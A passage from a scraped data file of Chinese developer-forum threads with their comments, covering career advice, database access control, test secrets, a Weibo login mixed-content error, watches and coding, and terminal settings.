"只显示首页、前一页、当前页和下一页，点击某个区域后才会查询总数返回末页，因为数据量过大时，查记录总数用于分页耗费太多时间了。", " 我怎么有种感觉这句话是你对我们说的。。。", "恶心微博的信息流。", "这个应该是产品的事吧，得看具体的场景啊。", " 开发很多时候都是替上面这几种人背锅啊～ 习惯就好了～ 哈哈"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>今天听到班长说居然有人去北京小米实习了。。。一直以为不是只有大四才可以实习的吗，还有编译原理，图形学都没上完呢。唉，看来找好的实习是没办法了。只能好好学习找个靠谱点的工作了。编程能力和普通大学生差不多吧。但是数学不是很好。\n个人比较喜欢安全， web ，运维一类，喜欢 python 编程，但是上网查了之后发现这些又要分好多类别。。。唉，不知道往那个方向走。只是希望以后的工作工资能达到平均工资，工作压力不是那么大那么累（看到坐在马桶上猝死的程序员有点怕怕），能有自己的空闲时间写写自己代码，做做自己的事就可以了。当然，最好能接触到女的。。。\n该专心哪个方向，各位大神？</p>\n</div></div>"], "reply": "18", "tittle": "大三，突然就要毕业了，程序员职业该往哪个方向好？", "comment": ["\"最好能接触到女的。。。\" 转销售区吧", " 转 销售 去*", " 不然找不到女朋友怎么办", "公务员吧", "转业", "找家小公司，所有人全在一块的那种，最好是论坛类的，这样运 mei 营 zhi 比较多，全在一起坐着", "念书的时候都没泡妞，期待着工作接触女生。天真啊。", "人力部门基本上全是妹子 2333\r", "说正题，我觉得楼主最好先挑公司，在公司里挑岗位，然后针对工作内容和岗位要求去复习", " 其实主要是因为各个公司对岗位的划分方式可能不一致", " 一般不都是公司挑人吗， hh", "讲真，工作以后泡妹子比在学校难不止 100 倍。", "2016 年的人均年薪排行榜 华为最高 也很辛苦 其他的金融比较靠前 所以你懂的  \r", "自己工作程序员几年 感觉工资比起其他行业不低 但是真的说存钱买房可能和朋友事业单位相比没差 还辛苦\r", "再给我选择 我考银行  不济的话考公务员或事业单位", "找不到就找不到呗。\r", "\r", "说得好像你周围全是女的你就能找得到女朋友一样。", "过来人告诉你，赶紧在大学里找女朋友", " 我也是有这个想法，主要是这种事业单位一般据说都得有关系才能进去", " 都大三了，晚了", "正在接收新任务......\r", "主线任务：未来职业发展方向（ 0/1 ）……\r", "支线任务：女朋友（？/？）………\r", "支线任务毕业后难度徒增，建议提前完成以进入下个副本", "🙊女朋友和职业没关系"]},
{"content": ["<div class=\"topic_content\">最近要做这个，有经验的前辈能不能介绍下，先谢过了</div>"], "reply": "1", "tittle": "有没结合使用 Spring Boot 和 jQuery EasyUI 前后端分离开发的例子？介绍", "comment": ["没看懂，不分离的话什么样子？用 GWT 生成前端代码？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>不提测试覆盖率在软件开发中的重要性……\n一个开发组里面的项目能维持良好的测试覆盖率，说明以下几点:</p>\n<ol>\n<li>同事都是靠谱的人，在做好需求的同时能够保证测试通过。</li>\n<li>这个组的工作量不算多。假如活多到加班加点做不完，谁会去管测试？</li>\n<li>技术债不多。良好的测试覆盖率说明项目的雷区不多，至少也能在你踩雷之前触发警告。</li>\n</ol>\n<p>面试当前工作的时候，我特地问了面试官（也是我现在所在组的同事，不过已经离职了）组内项目的测试覆盖率是多少。现在看来这是个明智的决定。</p>\n</div></div>"], "reply": "15", "tittle": "良好的测试覆盖率很有用", "comment": ["机智的楼主", "楼主的智慧", "萌新问一下什么叫测试覆盖率？", "    Test Coverage.", "在国内不是先问有没有写单元测试，再问测试还能正常运行吗？最后才问覆盖率。\r", "\r", "测试是一块，自动化也是一块。\r", "\r", "对于二三线城市，找到这样的工作环境无疑是梦。", " 就是有单测的代码占总代码的百分比， test coverage ，→_→，也是屌，除了字面意思没啥卵用", " 测试是懦夫行为！", "我对我的代码十分自信。不需要测试。哈哈哈。", "需求时时改，功能频繁加，业务不规范，从未见文档，一人搞起前后端，还要写测试？", "大部分人还写个毛测试，活都干不完，还写测试，一个人做 5 个人活！", "测试很重要，不需要测试的，可能你的代码真的难当大用，没有尽力过大风浪。", " debug 是弱智行为！ ^_^", "对于一个企业来讲做不好测试肯定也做不好产品的吧", "我都没写过测试……", "我也没有写过测试。。不能自动化。。不想写测试。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"QQ 截图 20170407095020.png\" src=\"https://ooo.0o0.ooo/2017/04/07/58e6f082c2892.png\"></p>\n</div></div>"], "reply": "3", "tittle": "George 是什么鬼", "comment": ["别人的名字而已把。。", "我也收到了，而且职位也是我在做的，怀疑是从 GitHub 找到的联系方式。\r", " ", " 和我收到的是一样的，然而我并不是做嵌入式的..."]},
{"content": ["<div class=\"topic_content\">各位大佬好，小弟最近需要做一个任务，任务是这样的：\r<br>\r<br>在网页里面填写配置，之后这些配置会写入到真正的配置文件里面，我需要将这些配置保存版本，供网页用户自由前进回退。\r<br>    \r<br>现在我有两种方案：\r<br>\r<br>方案一：在数据库中建一个表，表里面存在两个字段，一个时 commit id,一个是 commit massage,每有一次新提交都会在这个数据库里面引发写入，但是如果是回退不会。这样的话，每次加载网页，都会读数据库，将配置的版本 load 进去。\r<br>\r<br>方案二：每次 load 页面，都会调用一次 reflog ，但是 reflog 因为回退的原因，存在重复的情况，这时我需要手工去重，并保证顺序。\r<br>    \r<br>如果是你的话，你选择哪一种呢？非常感谢！</div>"], "reply": "4", "tittle": "使用 Jgit 实现对配置文件的版本控制，哪种方案好呢？", "comment": ["干嘛要 reflag ，直接 log 不行吗", "为什么用 git ，感觉似乎有些大材小用", "直接写数据库打时间戳，居然想到 jgit ，也是服了。", "\r", " \r", " 配置文件分布在好多表里，请问，这种情况如何使用数据库打时间戳版本控制呢？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>云沃客主题开屏设计比赛</h1>\n<p><strong>报名地址：</strong><a href=\"http://t.cn/R6r1X8a\" rel=\"nofollow\">http://t.cn/R6r1X8a</a></p>\n<hr>\n<p><strong>比赛活动描述：</strong></p>\n<p>1 、为云沃客设计开屏图。主题可从以下选项中任选一个进行设计：\n愚人节\t劳动节\t国庆节 端午节\t中秋节 1024 节 七夕</p>\n<p>2 、参加方式：\n在此项目页接单，并在报名时，在附件中上传自己的参赛作品。\n入围者将获得基础奖励 100 元。后续通过投票选出的大奖我们将以里程碑及奖金形式发放剩余奖金。获奖者奖金不与基础奖励叠加。</p>\n<p>3 、奖励设置：\n我们会选出优秀作品，公开投票，第一名 1000 ，第二名 800 ，第三名 500 ， 4-10 名每人 200 元， 11-30 名均可获得 100 元参与奖励。</p>\n<p>4 、活动开始和截止日期： 3 月 31 日-4 月 15 日\n作品提交截止日期： 4 月 11 日</p>\n<p>5 、参与活动要求：</p>\n<p>①APP 开屏图片尺寸： 750*1334 像素，格式： png ，名称：云沃客开屏+所选主题。</p>\n<p>②突出云沃客，必须体现云沃客 logo ， logo 下载地址：链接: <a href=\"https://pan.baidu.com/s/1miuiPni\" rel=\"nofollow\">https://pan.baidu.com/s/1miuiPni</a> 密\n码: vxvj</p>\n<p>并与所选主题结合，烘托出节日气氛，使二者协调呈现；</p>\n<p>云沃客理念：让自由工作更简单，其他文案或资料请查阅云沃客官网： <a href=\"http://www.clouderwork.com\" rel=\"nofollow\">www.clouderwork.com</a></p>\n<p>③色彩无限制，符合主题及云沃客理念即可。</p>\n<p>④风格要求与主站风格相呼应，与所选主题情境融洽。</p>\n<p>⑤拒绝粗制滥造、与主题及云沃客无关的作品参赛，此类作品不予以评奖和展示。</p>\n<p>⑥获奖作品及赏金猎人的署名将在云沃客开屏展示哦</p>\n<p><strong>注：符合设计要求及参赛条件的作品才能通过获得基础奖励和参与评奖及展示。</strong></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "[云沃客] 主题开屏设计比赛", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>因为是一堆跳转操作，普通的页面出现 https 加载 http 脚本会弹出提示让你允许，这个还不会弹出提示</p>\n<pre><code>crossdomain2.php?action=login&amp;entry=weibo&amp;r=https%3A%2F%2Fpassport.weibo.com%2Fwbsso%2Flogin%3Fssos …:1 \nMixed Content: The page at 'https://login.sina.com.cn/crossdomain2.php?action=login&amp;entry=weibo&amp;r=https …' was loaded over HTTPS,\nbut requested an insecure script 'http://i.sso.sina.com.cn/js/ssologin.js'. This request has been blocked; the content must be served over HTTPS.\n</code></pre>\n</div></div>"], "reply": "30", "tittle": "新浪微博 pc 登录不上去好几个月了。。。难道只有我一个人？从安全入口加载不安全脚本", "comment": ["卸载手机端 app 后问题解决", "屏蔽广告关了", " #1 \r", "回帖不看帖比看帖不回帖更烦人\r", "\r", "\r", " #2 \r", "电脑端 屏蔽广告无关\r", "不是被屏蔽 看明白了 https 页面加载 http 脚本 正常如果是完整页面这么加载会提示 是否允许加载非安全脚本\r", "\r", "这个全程在 ajax 或者跳转页面实现 chrome 并不会弹出 允许不安全的脚本的选项就被直接 block 了", "浏览器有 https everywhere ？ 停一下就好\r", "\r", "这个问题好久了。我都是只能停一下再上。久而久之，就直接用 UWP 版本了。", "手机号登陆啊", "是这样的，电脑上登录，会让你用 app 扫码登录。然而那个二维码 竟然显示不了。。。只能选择用手机号，发动态验证码登录。。。", "我的情况是密码，新浪药丸", "密码错误", "我的是 \" 当前网络超时，请稍后再试()\"", "大概前年的时候，新浪微博我得连着输对至少 3 次验证码才让登陆，到现在也是反应极慢", "浏览器有 https everywhere  这个插件？我的出现的情况和你差不多，每次需要停用 https everywhere 插件才能正常登陆微博。", " #11 \r", "停用也无效……知道是 hsts everywhere 的问题 但是停用因为缓存依然有效……", "不上微博", "尝试到 hsts 设置里删除相关域名\r", "chrome://net-internals/#hsts", " #14 \r", "查询不到相关域名有 hsts 记录\r", "盲删除，依旧", "新浪微博体验非常差，站外打开普通页面要经过 n 次跳转，而且页面加载的元素太多，没做资源合并，我在一些便宜的无线路由器上访问新浪微博还碰到过把路由器弄挂的情况。。。", "手机上 qq 浏览器经常登录不了微博， 有时是提示 cookie 或者页面异常什么的。\r", "我就觉得微博的前端真的是非常不专业。", "也可能是扩展程序 Ghostery 的锅……\r", "实在不行就先登新浪首页，然后直接跳转到微博（参照 ", " 的方法）", "就是屏蔽广告的问题", "一年无法用 pc 登录了。。。各种提示密码错误", " 一样 而且就算加载出来 这边扫上了 网页版半天跳转不了", " #8 同密码错误，强制要求我改密码，还不能是任何以前用过的，然后改了提示我手机号得绑，不绑不给改。💊", "微博用户体验非常差，兼容性非常差，我的登陆没问题", "我都是先登录新浪，然后跳转到微博", "我也遇到。点击登录按钮，没有反应。还重置浏览器。也无解，就没有用 pc 的。现在都用手机 web 版。", "我在 pc 上也登录不上，还好绑定了 qq 账号。登录都是用 qq 登录的。。。", "早就不上了，", " #27\r", "我只需要图床微博而已 微博账户微博数量是 0\r", "\r", " #24 \r", "跳转也要经过 sso 这个，一样卡主\r", "\r", " #26 \r", "试过了， QQ 登陆貌似也要跳转 sso 这个东西然后卡住\r", "\r", "\r", " #19 \r", "并不是", " 新浪 pc 端不行，而且广告满天飞，简直和贴吧一个德行。", "我在微博主站一直是登录超时，请稍候重试。只能找其他网站点一下使用新浪微博登录，才能正常使用"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近买了一块表，戴在左手，敲代码表带老是卡到 mac 左下角，抬高左手的话，和右手不平，问下怎么样戴着手表舒适地敲代码？</p>\n</div></div>"], "reply": "89", "tittle": "戴手表怎么方便地敲代码？", "comment": ["键盘腕托或敲的时候摘下来", "50 包邮给我", "我 280 元在淘宝买的劳力士没有这个烦恼。", "所以我从来不戴任何表……\r", "其实是穷", "戴到脚脖子上。", "摘下手表", "你需要一个表盒", "钢带的么，换成皮带的也许会好点", "换皮表带，注意表带长度，不要使卡扣位于正下方。", "以前带佛珠，后来也是一直卡着，就不带了", "戴在脖子上", "像我这种买不起表的就没这种烦恼", "同 mac,比你更小的小米手环 1 代都卡...无解..只能脱下来...", "为了避免这个问题，我戴的是尼龙带~", "有钱人的烦恼系列。", "雇个人帮你戴", "外接键盘。。", "小心你的手腕啊，带 apple watch 路走多了，手腕都疼。", "练习单手敲代码", "小时候戴表都是直接画一个在手腕上的。厚度=0 ，摩擦=0 。", "戴在脚上", " 一样的，皮带表扣依然是金属的", "最近买了一块江诗丹顿，戴左手了，开车时候老是磕法拉利方向盘！", "平时到了办公室就把手表摘下放到桌子上，出门时再带上。", "戴着不舒服，出门时才戴上。", "摘下来不行么？难道有人偷？", "我刚好摘下来充电", "朋友，真是苦了你了。", "敲代码的时候不能除下来吗？", "最近买了一块江诗丹顿，戴左手了，开车时候老是磕法拉利方向盘！", "楼上 6", "卡西欧 m5610 没有这个烦恼", "套到弟弟上", "戴在右手，或者换皮表带。皮表带夏天容易出汗不过。", "摘下来试试？", "表带松一点，往上撸一点就碰不到了", "看完楼上的评论们忍俊不禁的扑哧一声笑了 哈哈哈哈", "手掌小？", "表在写代码的时候有用么？", "没办法...改怀表吧。", "从来没见程序员带过表，就算有也是 apple watch ，你爱好表说明潜意识适合社交类工作", " 至于这么刻板化么…", "同程序狗，戴表还没被卡过，可能是我手腕细吧。。。", "换 mac", "以前也有这个问题，现在戴薄表。", "换成小米手环可破", "所以我现在手腕上都不想戴任何东西了……", "外接键盘", "默念：别装，别装", "摘下来，就是这么简单。", "哈哈哈哈 这个贴子", "我一到工位就摘下来。。。。 然后下班再戴上", "放抽屉里", "穷玩车富玩表，屌丝玩电脑", "卖了吧，楼下看看有没有人收", "戴手表就不要敲代码了！写 PPT ， WORD ， EXECL", "往后捋捋", "如果 LZ 是单身的话，那就带在你的麒麟臂上，用弘二头肌卡住。下一题", "可以戴在小弟弟上", "放抽屉里，锁起来", "这是我有史以来，见过逼格最高的！", "调松点 往后捋一捋 --\r", "\r", "或者外接个蓝牙键盘", "外接键盘无压力", "出门带，进门摘~  ", " ", "我每天为了省下坐地铁的钱，天天自己开奔驰上班。", "取了", " 就是 mac 才会容易被卡，尤其是大掌托的 15 寸", "用外接键盘……", "这个有体验，手表卡口的金属和本子金属的摩擦，让人毛骨悚然……后来都用 ikbc 了", "为什么要戴手表？？？？？？？？？？为什么带\r", "？？？？？？？？？？？\r", "完全不符合身份", "再买一块戴右边。", "以前带，怕刮花机器 然后取了，一直到现在都没带过了", " 什么身份才有资格戴手表？？？？？？？？？", "可以把表摘下来", "办公 /家居摘下来，出门带，", "再戴两个，这事最吼的。", "一般工作的时候是不带手表的，要脱下来，很好的摆放在旁边让过往多人看着。", "带个劳确实不好敲啊...", "表带长一点戴在肱二头肌处-_-", "摘下来不就完了。为什么会有人问这种问题？为什么还有这么多人回答？这是怎样的一群人？", "手表究竟是带左手还是右手呐，我带的是右手……", "网上撸一点", "用怀表不就行了", "两种方案。\r", "1. 码字的时候手表拿下来。\r", "2. 弄个笔记本架子，然后外接键盘。", "1. 顺丰到付给我；\r", "2. 再买一块戴右手。", "带个手环都嫌碍事，后来没带几天就送人了。。。。", "51 包邮给我。带你装逼带你飞", "把 mac 左下角砍掉", "给我戴"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近看到阿里的未来酒店，但是不知道什么鬼，业界的消息也很少，好像还不是阿里集团的，是飞猪的外包？</p>\n</div></div>"], "reply": "8", "tittle": "阿里未来酒店是啥", "comment": ["看了两条新闻，好像是信用支付免押金、自主选房、直接入住。\r", "\r", "在用烂了“云”、“智能”后他们准备开始搞“未来”了？", "还不错，支付免押金、自主选房、直接入住，退房免查房，房卡往前台一扔直接走，住完扣花呗", " 简直就是日本的情侣酒店😂", "国内很多酒店都是会员免查房免押金，只是阿里包装了一下。", " 要什么房卡， 支付宝里一键开房\r", "\r", "门。", "上市了，特别是在外国，要不断地炒作新概念新数据忽悠外国人", "炒概念而已", " 手机没电还进不了房间了？最多给你多个选择，不可能代替"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>下载： <a href=\"https://itunes.apple.com/cn/app/coderpursue/id1094338006?l=en&amp;mt=8\" rel=\"nofollow\">https://itunes.apple.com/cn/app/coderpursue/id1094338006?l=en&amp;mt=8</a></p>\n</div></div>"], "reply": "17", "tittle": "推荐一个 Github iOS 客户端", "comment": ["不是很懂你们这些非要在手机上敲代码的", " 可能是 ipad pro", " #2 是我疏忽了。不过我觉得 iOS 系统的设备就算屏幕大上天了，也谈不上什么生产力", " +10086", "这玩意有什么用？下班了还想着上班时候的那些代码？这是敬业还是苦逼呢 没明白", "这展示图不忍直视", "个人用 CodeHub 和 CodeBucket", "为啥不用 CodeHub 呢", "闲的蛋疼", "codehub+10086", "为什么要用手机干这个。。。", "Github 上存一些自己的文档之类的不是很正常。", "再用 gitbucket\r", "可惜没离线缓存功能 TAT", "也不一定是敲代码啊，我也喜欢在手机上刷一刷 GitHub Feed ，看看大家都 fork 了啥，看看有趣的项目什么的，回复别人的 comment 或者 issue 。。。", "在 iPad 上用 Git2go ，可以 clone 可以 commit 可以 push 可以 pull 有代码高亮， 只是输入法不太方便", "...", "权限要的好高。。。不敢用", "SSH key", "delete repos"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>大家好，我遇到过一个任务。需要在数据库里面通过用户指定的时间段读取数据，但是如果用户指定的时间跨度大的话，数据量就超大，读取得是分钟级别的。</p>\n<p>这个时候，如果我需要的数据可以分页显示的话，我可以分页查询，这个非常好好解决。</p>\n<p>但是，如果我需要某种计算，非得需要全部的数据才能完成计算，这个时候，用户就需要在网页前面等数分钟，这种情况，用户体验，内存占用都是不可用级别的。</p>\n<p>这种情况，大家一般怎么解决呢？非常感谢！</p>\n</div></div>"], "reply": "12", "tittle": "读出大量数据，速度慢，内存大，用户体验低如何解决呢？", "comment": ["加个小时统计，或者按天统计表", " 谢谢回复，你的意思是让程序后台定时运行吗？然后运行结果写入数据库？", "需要计算的指标条目应该是固定的吧， 有变动的应该是时间？\r", "\r", "\r", "如果上述属实，那应该有最短统计周期吧，比如看 1 小时的数据变化， 1 天的变化等等。\r", "\r", "你在原始数据基础上应该增加计算好的数据项目。比如原始数据是分钟级的，你可以按照最低统计周期为频率，计算需要计算的指标，在用户需要调用时，只是把统计指标加总即可。", "这不是典型的类 mapreduce 场景吗？大数据量还需要快速的处理结果，似乎是矛盾的吧？所以要么你把计算并行化能加快实时处理的速度，要么提前批处理好。", "通过时间颗粒度控制总数据，就是所谓的抽样了", " 谢谢回复，有道理，在很多需求的情况下你说的应该没问题，但是得看需求，多谢了。", " 抽样也是个好方法，在很多情况下非常管用，感谢！", " 大哥，突然觉着你说的好对啊，让我茅塞顿开啊，这本身就很矛盾啊！！\r", "\r", "我试着再从需求方面找找原因。\r", "\r", "谢谢", " 是的，应该有一张，小时统计表，按天统计表", "不歪需求的情况下。\r", "\r", "本来我想说需要实时的话，多个几个读取用的从数据库来搞。不过看你的描述每次都要等数分钟，那么其实需要把一些关键的指标提取出来预处理完成。\r", "类似于搜索引擎的做法，比如 sphinx 。这类组件叫做索引器，只做条件匹配的部分，并且针对具体的业务有合适的高速算法（或者是解决方案）。\r", "这样，你的业务中计算的部分通过索引器解决通常是毫秒级别，再通过传统的数据库取出对应的条目，速度应该是非常快的。", "如果需求不可控（搞不清产品想怎么玩），粒度不可控，这种实时还是上搜索引擎吧， ES 一类的\r", "如果你能撕逼撕赢产品，不想增加额外成本，按楼上各位说的，按时间粒度做预处理", "实在不行就上 spark"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在做项目中涉及到视频播放，同事推荐了一款视频插件 —— ckplayer 。它支持的很多种格式。但是在使用中我也发现了一些不足之处。\n比如说在获取视频对象的时候，如果调用的是 html5 视频，可以用 CKobject.getObjectById('ckplayer_id') 获取到，但是如果单纯调用的是 flash 视频，我用这个获取视频对象的方法就不行了，用这个方式获取对象调用自带的方法的时候，控制台总是报错 —— *** is not function 。其实就是这个对象没找着。我在控制台输入 CKobject 显示他下面带的方法也是不执行的，请问这里有没有大佬能提供好的解决方法啊？？？<br>\n第二个问题，基于第一个问题上，我用 CKplayer 的另一个调用视频的方式（自己选择是调用 html5 视频还是 falsh 视频）,这样的方式确实可以获取到视频对象和方法，但是用到 videoSeek(int)的时候,它总是定位到那个时间点然后一瞬间快进或者后退了几秒，有时间差。这个 bug 我看官网上的例子也是这样的。<br>\n难道说我该换个视频插件啦？<br>\n有没有大佬能推荐几个好用的视频插件呀。</p>\n</div></div>"], "reply": "9", "tittle": "有没有大神有用到过 CKplayer 视频播放插件的？？？", "comment": ["最佳方式使用 H5 视频\r", "flash 什么的去死吧\r", "IE 先死", "建议固定一种视频模式\r", "我用的 mp4  引入没问题\r", "swf 用默认 flash 播放器", " \r", " \r", "我现在也发现如果只调用 html5 视频的话，那我还不如直接用 h5 视频呢。</br>\r", "我们后台给了 flv 格式的视频，我查 ckplayer 的帮助手册，这个格式的视频只有调用 flash 才能播放，所以……", " 我记得 chrome 都开始不支持 flash 了，果断远离 flash 吧\r", "ckplayer 比原生 h5 好的地方是各种 API ，样式也多，比原生 h5 还是有不小的优势\r", "只要你别用 IE ， Edge", " 直接 embed flash 呢", "video.js", "flv.js", "楼上给的 video.js  和 flv.js 都可以"]},
{"content": ["<div class=\"topic_content\">我是数据科学部的， 最近 IT 部门说要加强对数据库管理，取消所有人的读 /写权限。数据部门如果要读取数据，得写申请要读取哪个库的哪个表。然后交给他们，他们导出最近 3 年的数据，然后交给我们这边。\r<br>\r<br>突然就莫名其妙的的有点生气，感觉这样太不合理。\r<br>\r<br>想了解各位贵司都是如何操作的。</div>"], "reply": "32", "tittle": "对公司加强数据库管理有点不满。。。", "comment": ["一个邮件开通帐号，然后随便读", "你们麻烦，人家不也麻烦。麻烦从来就不是问题，解决麻烦提高效率更是程序员天生就爱干的事情。加流程肯定是有原因的，你们交流好为什么要加流程，怎么改善流程就行了呗。", "加强数据库内部控制，是防止内鬼泄露数据的好办法。\r", "\r", "我的设想更极端，数据库完全不直接开放读写，而是通过防火墙边界上的 web service 提供统一接口共享。", "一个 readonly 帐号，随便读", "为什么突然要加强数据库管理呢？", "再架个同步数据库同步指定数据算了", " #3 亚马逊不就这么搞的么, 所以搞出了个 aws, 挺好", "你们居然可以导出生产数据？\r", "我们这边只是在虚拟桌面上有部分表只读权限。绝对是不能导出的。", "说句不好听的话，楼主可真是个妈宝", " 只要能看到数据，该泄密还不是一样泄密。", "这种事情建议先了解下为什么突然出这么个措施，目的是什么。然后针对这个目的看看是不是有逼可撕，是不是有更好的解决办法。需要上级出面就去争取上级的力量。现在的这个措施明显对两边部门都是降低效率的，显然是个下策。但是公司都宁愿出此下策了，那估计是之前发生了什么事情吧。", " 这算人参公鸡嘛？", "线上数据应该谁也不允许看才对", ",是所有数据库， MySQL,mongo, etc,包括线上和线下", "我们使用 AWS 本部门都有权限，但是需要其他部门数据时候一般都给个同步地址", "从去年开始我们也开始这样搞了.\r", "提出这个需求的是运维.因为现在生产的数据很值钱.老板也同意了.\r", "当时觉得很不习惯,本来有读权限,可以随时查看数据方便调试.\r", "首先数据跑了一下 AES 加密防止泄漏\r", "后来运维给开发了一套 web 的应用\r", "主要就是 sql 解析器\r", "不同的权限可以查不同的表\r", "虽然效率确实比以前慢了很多感觉做什么都有很多掣肘\r", "但后来想想为了安全生产就想开了.", " 感觉运维真是一个奇怪的职位（原谅我外行），还要开发应用给你们用……还要 24 小时待命（猜的），这说明技术要求也不低，总有一种比开发还强大的感觉……所以 薪水会更高么 0 0", "> 我是数据科学部的， 最近 IT 部门说要加强对数据库管理，取消所有人的读 /写权限。数据部门如果要读取数据，得写申请要读取哪个库的哪个表。然后交给他们，他们导出最近 3 年的数据，然后交给我们这边。 \r", "\r", "如果不是发生了什么事情， DBA 也不想这么麻烦啊，明显双方都麻烦的事情。\r", "\r", "> 突然就莫名其妙的的有点生气，感觉这样太不合理。 \r", "\r", "你觉得不合理也得思考思考为什么吧\r", "\r", "> 想了解各位贵司都是如何操作的。\r", "\r", "对于数据平台，专门在凌晨自动同步数据库数据到 hadoop 上，数据平台自己随便玩。", "我们只有只读权限。", "数据库的权限管理问题，本来就应该重视。想起当初携程的事情，不知道是真是假。", " #17 没有啊 运维基本都会 python 写个普通的小程序没什么吧.运维搞的好基本没什么太多东西需要做啊. 很多脚本都写好了. 装环境之类的直接跑脚本就好了. 难道你理解的运维是人肉运维吗? 肯定是多数时间系统自己监控 出了问题报警邮件和短信啊.然后人工介入.", "很合理啊……不方便归不方便，但认为不合理那就不对了，这种线上库就该加强管理，谁想读写都得申请，出了问题才能方便理清责任，现在这种数据越来越重要的时代对数据加强管控并没有什么不妥。", "这不是很正常 大公司不要说数据库了 你就是访问或者使用一个模块都可能得有权限审批 不然几千上万人的大公司人手一份全权限不都乱了套了？", "正常。。", "生产数据有些是隐私 能随便给开发人员么 我们也有生产模拟环境 但是都是处理过的数据 附件 金额什么全被抹去了", "以前在另一家公司的时候，数据科学团队的实习生因为觉得 varchar 类型不好用，直接改成了 int...表里的数据全毁，从那之后果断收权限了.....", "这不奇怪啊，那些做医院的。\r", "什么?你要直接操作数据库权限?\r", "最多给你个 api,还是按规则可以给的表里指定字段的查询权限\r", "想要别的,先去走个流程审批后再说", " 没备份么(╯‵□′)╯︵┻━┻", "我是推崇权限控制和流程控制的，京东就有内鬼出售数据，加强数据库管理是对客户负责，也是对公司负责。", "我们的生产环境是要去带专门门禁和 24 小时视频监控的专用物理机房里登录专门的终端通过专线才能连接上的...\r", "\r", "所有纸质资料只能带入不能带出，存储设备就更是做梦了...\r", "\r", "生产环境的数据导出之前都要有专门的负责人员把所有隐私项目全部 mask 掉以后才能拿出来的\r", "\r", "即使如此按照规定用完以后还需要拿强制擦除工具确保一定级别的复写擦除以后才算完事...\r", "\r", "所以我很惊讶题主公司竟然才开始搞这些吗", " wow", "京东数据泄露内鬼被抓 涉案 50 亿条公民信息泄露\r", "2017-03-13 21:14:44 来源：凤凰 WEMONEY\r", "可能因为别的公司出了问题，很多公司才开始重视起来这方面吧"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>大家好，</p>\n<p>想請問大家會如何處理本地環境中，測試時期需要使用到的屬性？</p>\n<p>例如：</p>\n<p>整合測試部分希望測試 Facebook 綁定的事件，因此需要使用到 Facebook App 的 app-secret ，</p>\n<p>再透過 CI Server 時，因為可以直接設定 encrypt 的環境變數，因此 app-secret 可以直接直接設定、整合</p>\n<p>測試可以正確地執行。</p>\n<p>但當其他夥伴希望在本地環境執行測試時，常常會遇到需要特別跟「知情人」詢問 app-secret 的情況。</p>\n<p>不知道大家有沒有遇過類似的狀況？又是怎麼處理呢？</p>\n<p>類似的情況像是： GCP 的 credential.json</p>\n<p>謝謝</p>\n</div></div>"], "reply": "8", "tittle": "測試環境變數如何取得呢？", "comment": ["这种依托第三方公司的业务逻辑当然是共用或者再开一个认证呗~", "感謝回覆呀\r", "\r", "我想再描述主訴，是本地測試時，有沒有辦法從一個固定管理的地方、獲得 encrypted data ？\r", "\r", "如何避免只能由知情人提供資訊這樣的工作模式", "可以考虑把外部授权信息通过内部授权的方式传达, 例如只有某些特定权限的角色才能访问某系统, 该系统提供了获取 encrypted data 的接口.", "哇  楼主台湾人啊  “变数”“透过”“资讯”", "最好开个测试用 secret\r", "你也要考虑测试有 bug 出事的情况\r", "如果是同事，或者相关工作人，那可以放内网共享\r", "最好控制分发范围，如果泄露，不会牵扯到其他人\r", "外部人员让他们自己申请 fb 开发者账号", "再开个专门的，这样即使泄露也没太大影响，然后放到 git 或者内部文档服务公示就行了吧", "我们使用 OneNote 和 OneDriver ，分好目录，然后设置权限。有新来的伙伴时就把他加入相应的权限组。", "會先以雲端空間整理一份設定檔的方式來解決問題\r", "\r", "希望後期引進 Spring cloud 以 Cypher 的方式儲存這類的資訊\r", "\r", "測試用 secret 會研究一下 Test App 的部分\r", "\r", "感謝各位回覆"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>大家可否贴一下自己运行：</p>\n<p>$ echo $TERM</p>\n<p>之后是什么返回值？</p>\n<p>我的是：</p>\n<p>xterm-256color</p>\n<p>系统环境是 OS X。我特别想知道各种 Linux 发行版的默认 Term 是什么。谢谢大家。</p>\n</div></div>"], "reply": "6", "tittle": "真心想了解一下大家用的都是什么 TERM～", "comment": ["谁可以提供一下 windows 10 下面的 ubuntu 子系统的 $TERM 值？", "$ echo $TERM\r", "xterm-256color", "xterm-256color 并不表示你用的 terminal\r", "我用的所有支持 256 色的终端都要把$TERM 设置为 xterm-256color, 包括 putty, conemu, iterm2, urxvt", " 没太懂你的意思。是不是说，即使 terminal 支持 256 颜色，有时候也需要手动把 TERM 设置为 xterm-256color 才能正常使用 256 种颜色？或者说，能力有，但是需要开启一下才能用？", "好像 Mac 的 Terminal 默认开启了 xterm-256color", " 嗯对，有些终端支持 xterm-256color ，但默认$TERM 却不是它。 vim, tmux 都会在初始化的时候查这个环境变量。你可以试试"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>都在讨论 Gnome ， Unity 啥的，我来张图吧。</p>\n<img src=\"http://wx3.sinaimg.cn/large/005Gcprogy1fedbs4ae2kj30je0j6mxr.jpg\">\n<br>原标题叫： A Memory Comparison of Light Linux Desktops\n<br>传送门： <a href=\"https://l3net.wordpress.com/2013/03/17/a-memory-comparison-of-light-linux-desktops/\" rel=\"nofollow\">https://l3net.wordpress.com/2013/03/17/a-memory-comparison-of-light-linux-desktops/</a>\n<p>看着那一个个 Gnome 3 ， Unity ， KDE 那一个个肥硕的身材，呵呵。</p>\n<p>我判定桌面的唯一标准是：是否更好用了(Accessibility)，是否更高效了(Efficiency)，综合起来能否提升工作效率(Performance)。</p>\n<p>最后 Gnome 2 是经典的， MATE 大法好。</p>\n</div></div>"], "reply": "52", "tittle": "[一图流] Linux 